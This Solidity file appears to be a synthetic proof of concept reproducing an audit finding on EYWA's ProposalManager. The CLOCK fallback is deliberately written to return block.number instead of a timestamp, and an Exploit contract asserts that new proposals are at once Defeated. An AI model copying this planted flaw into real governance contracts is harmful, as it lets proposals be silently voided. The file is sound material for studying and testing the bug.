// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  EYWA ProposalManager.CLOCK (MixBytes, Nov 2024, finding #44336).
    SYNTHETIC, cheatcode-free. EscrowManager has no CLOCK(). The catch
    returns block.number (@> VULN). votingDelay is 2 days, so the snapshot
    is block.number + 2 days and the proposal is already Defeated.
    The timestamp clock is still Pending. */

interface IClock {
    function CLOCK() external view returns (uint48);
}

contract EscrowManager {}

contract ProposalManager {
    EscrowManager public token;
    uint256 public constant votingDelay = 2 days;
    uint256 public constant votingPeriod = 1 weeks;
    uint256 public proposalSnapshot;
    uint256 public proposalDeadline;

    constructor(EscrowManager token_) {
        token = token_;
    }

    function CLOCK() public view returns (uint48) {
        try IClock(address(token)).CLOCK() returns (uint48 timepoint) {
            return timepoint;
        } catch {
            // @> VULN: the catch returns block.number instead of block.timestamp.
            return uint48(block.number);
        }
    }

    function propose() external {
        uint256 snap = uint256(CLOCK()) + votingDelay;
        proposalSnapshot = snap;
        proposalDeadline = snap + votingPeriod;
    }

    function state() public view returns (uint8) {
        if (block.timestamp < proposalSnapshot) return 0;
        if (block.timestamp <= proposalDeadline) return 1;
        return 2;
    }

    function fairSnapshot() public view returns (uint256) {
        return block.timestamp + votingDelay;
    }

    function fairState() public view returns (uint8) {
        uint256 snap = fairSnapshot();
        uint256 deadline = snap + votingPeriod;
        if (block.timestamp < snap) return 0;
        if (block.timestamp <= deadline) return 1;
        return 2;
    }
}

contract Exploit {
    EscrowManager public escrow; // nonce 1
    ProposalManager public mgr; // nonce 2

    constructor() {
        escrow = new EscrowManager();
        mgr = new ProposalManager(escrow);
    }

    function run() external {
        require(block.number == 100, "block 100");
        require(block.timestamp == 1_700_000_000, "timestamp");
        mgr.propose();
        require(mgr.proposalSnapshot() == 172900, "snapshot is block.number + 2 days");
        require(mgr.proposalDeadline() == 777700, "deadline already passed");
        require(mgr.fairSnapshot() == 1_700_172_800, "fair snapshot is still ahead");
        require(mgr.state() == 2, "proposal is Defeated");
        require(mgr.fairState() == 0, "fair proposal is Pending");
    }
}
